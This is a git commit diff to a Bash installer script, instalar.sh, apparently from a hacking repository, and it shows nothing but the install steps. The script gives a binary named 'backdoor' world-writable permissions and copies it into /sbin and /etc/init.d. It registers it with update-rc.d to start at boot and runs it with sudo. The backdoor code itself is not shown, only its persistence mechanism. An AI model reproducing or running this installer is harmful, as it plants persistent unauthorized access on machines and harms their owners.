441f7986b50cb1c23b40f8f29d5d9c182bff7dab
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2017-06-05 15:46:28 +0200

    Update instalar.sh

--- instalar.sh
+++ instalar.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 chmod 777 backdoor
 chmod 777 telnetcliente
-cp telnetdd /sbin
-cp telnetdd /etc/init.d/backdoor
+cp backdoor /sbin
+cp backdoor /etc/init.d/backdoor
 update-rc.d backdoor start
 update-rc.d backdoor defaults
 sudo /etc/init.d/backdoor restart
-backdoor
+sudo backdoor
